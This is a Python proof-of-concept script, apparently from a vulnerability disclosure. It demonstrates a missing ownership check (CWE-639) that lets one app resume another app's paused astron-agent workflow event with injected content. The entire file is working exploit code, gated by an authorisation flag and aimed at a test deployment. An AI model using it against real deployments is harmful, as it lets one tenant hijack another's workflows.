#!/usr/bin/env python3
"""
astron-agent-poc V3 — CWE-639 — /workflow/v1/resume does not bind the paused event to the caller's app
======================================================================================================

`/workflow/v1/resume` IS an authenticated endpoint — it is listed in
CHAT_OPEN_API_PATHS (core/workflow/extensions/fastapi/base.py:19-23) and the
middleware verifies the caller's Bearer credential or the trusted gateway signature
(core/workflow/extensions/fastapi/middleware/auth.py:170-185). The defect is
downstream of authentication: the handler resolves the paused event from Redis by
the caller-supplied `event_id` and never compares the event's owning `app_id`
against the authenticated caller's app:

    core/workflow/api/v1/chat/open.py:106-165  (resume_open)

        event = EventRegistry().get_event(event_id=event_id)
        ...
        await EventRegistry().write_resume_data(...)      # no ownership check

So any authenticated app holding a valid Bearer credential of its OWN, which can
observe a paused event's `event_id`, can resume someone else's event with content
of its choosing. `event_id` is a Snowflake id (core/common/utils/snowfake.py:12)
that the platform itself discloses on observable channels — most directly, in the
INTERRUPT frame of the victim's own SSE stream.

Demonstration
-------------
    1. the victim app runs a flow that pauses at a question-answer node
       (needReply=true) and publishes `event_id` in its own SSE INTERRUPT frame
    2. the ATTACKER app — a different app_id — POSTs /workflow/v1/resume with that
       event_id and attacker-chosen content
    3. the resume is accepted; the engine consumes the injected content and the
       post-resume output flows to the ATTACKER's connection

Step 2 is the defect: the caller did not create the event it just resumed.

Scope
-----
Uses two credentials the operator of the authorised test deployment supplies. The
script creates one chat event (it expires via the node's own timeout) and sends one
resume. The flow must be the PoC's own seeded test flow (../env/payloads/). Exits
non-zero if the finding does not reproduce.

Usage:
    python3 v3_workflow_resume_event_authz.py --base http://localhost:7880 \\
        --victim-credential "$VICTIM_APP_KEY:$VICTIM_APP_SECRET" \\
        --attacker-credential "$ATTACKER_APP_KEY:$ATTACKER_APP_SECRET" \\
        --flow-id 7600000000000000001 --confirm-authorised
"""
import argparse
import json
import sys
import urllib.error
import urllib.request

MARKER = "astron-agent-poc attacker-injected resume content"


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def stream_post(url, bearer, obj, timeout=120):
    """POST and yield decoded SSE/JSON lines as they arrive."""
    req = urllib.request.Request(
        url, data=json.dumps(obj).encode(), method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": "Bearer " + bearer,
                 "Accept": "text/event-stream"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            yield r.status
            for raw in r:
                line = raw.decode(errors="replace").strip()
                if not line:
                    continue
                if line.startswith("data:"):
                    line = line[5:].strip()
                try:
                    yield json.loads(line)
                except ValueError:
                    yield {"raw": line[:300]}
    except urllib.error.HTTPError as e:
        yield e.status if hasattr(e, "status") else e.code
        yield {"raw": e.read().decode(errors="replace")[:300]}
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e.reason}", 3)


def frame_brief(frame):
    """Compact one-line rendering of a workflow frame."""
    if "raw" in frame:
        return f"    {frame['raw']}"
    choices = frame.get("choices") or [{}]
    c0 = choices[0]
    bits = [f"code {frame.get('code')}"]
    step = frame.get("workflow_step") or {}
    if step:
        bits.append(f"seq {step.get('seq')} progress {step.get('progress')}")
    if c0.get("finish_reason"):
        bits.append(f"finish_reason {c0['finish_reason']}")
    if c0.get("content"):
        bits.append(f"content {c0['content'][:80]!r}")
    return "    " + ", ".join(bits)


def main():
    ap = argparse.ArgumentParser(description="astron-agent V3 PoC (CWE-639)")
    ap.add_argument("--base", default="http://localhost:7880",
                    help="core-workflow base URL (default: http://localhost:7880)")
    ap.add_argument("--victim-credential", required=True,
                    help="victim app Bearer as KEY:SECRET (never printed)")
    ap.add_argument("--attacker-credential", required=True,
                    help="a DIFFERENT app's Bearer as KEY:SECRET (never printed)")
    ap.add_argument("--flow-id", required=True,
                    help="released test flow (with a question-answer interrupt node) owned by the victim app")
    ap.add_argument("--uid", default="victim_user")
    ap.add_argument("--chat-id", default="astron-agent-poc-v3")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="confirm you are authorised to test this deployment")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")
    if args.victim_credential == args.attacker_credential:
        die("the attacker credential must belong to a DIFFERENT app than the victim's")

    # ---- step 1: the victim pauses and the platform discloses event_id
    print("== step 1: victim app runs the flow; it pauses at the question-answer node ==")
    gen = stream_post(f"{args.base.rstrip('/')}/workflow/v1/chat/completions",
                      args.victim_credential,
                      {"flow_id": args.flow_id, "uid": args.uid, "stream": True,
                       "parameters": {"AGENT_USER_INPUT": "astron-agent-poc victim input"},
                       "chat_id": args.chat_id, "ext": {}})
    status = next(gen)
    print(f"  POST /workflow/v1/chat/completions (victim Bearer) -> http {status}")
    event_id = None
    for frame in gen:
        print(frame_brief(frame))
        ed = ((frame.get("choices") or [{}])[0].get("event_data")) or {}
        if (frame.get("choices") or [{}])[0].get("finish_reason") == "interrupt" \
                and ed.get("event_id"):
            event_id = ed["event_id"]
    if not event_id:
        die("no INTERRUPT frame with event_id observed — is the flow released and does "
            "it pause (question-answer node, needReply=true)? see env/build-and-run.md", 5)
    print(f"  INTERRUPT frame disclosed event_id = {event_id}")

    # ---- step 2: a DIFFERENT app resumes the event
    print("\n== step 2: a different app resumes the victim's paused event ==")
    print(f"  POST /workflow/v1/resume (attacker Bearer, event_id {event_id})")
    gen = stream_post(f"{args.base.rstrip('/')}/workflow/v1/resume",
                      args.attacker_credential,
                      {"event_id": str(event_id), "event_type": "resume",
                       "content": MARKER})
    status = next(gen)
    print(f"  -> http {status}")
    if status != 200:
        die(f"resume rejected with http {status} — V3 did not reproduce on this build", 6)
    saw_stop, saw_marker = False, False
    for frame in gen:
        print(frame_brief(frame))
        c0 = (frame.get("choices") or [{}])[0]
        if MARKER in str(c0.get("content", "")):
            saw_marker = True
        if c0.get("finish_reason") == "stop":
            saw_stop = True

    # ---- verdict
    print("\n== verdict ==")
    if saw_marker or saw_stop:
        print("  V3 REPRODUCED. The engine accepted a resume of the victim's event from a")
        print("  different app_id, consumed the attacker's content as the answer, and ran")
        print("  the remaining nodes along the ATTACKER's connection.")
        print()
        print("  What this is NOT: the endpoint is authenticated — an invalid Bearer is")
        print("  rejected by the middleware before the handler. The defect is the missing")
        print("  caller-app-to-event ownership check after authentication.")
        return 0
    die("resume accepted but no engine output observed on the attacker connection", 7)


if __name__ == "__main__":
    sys.exit(main())
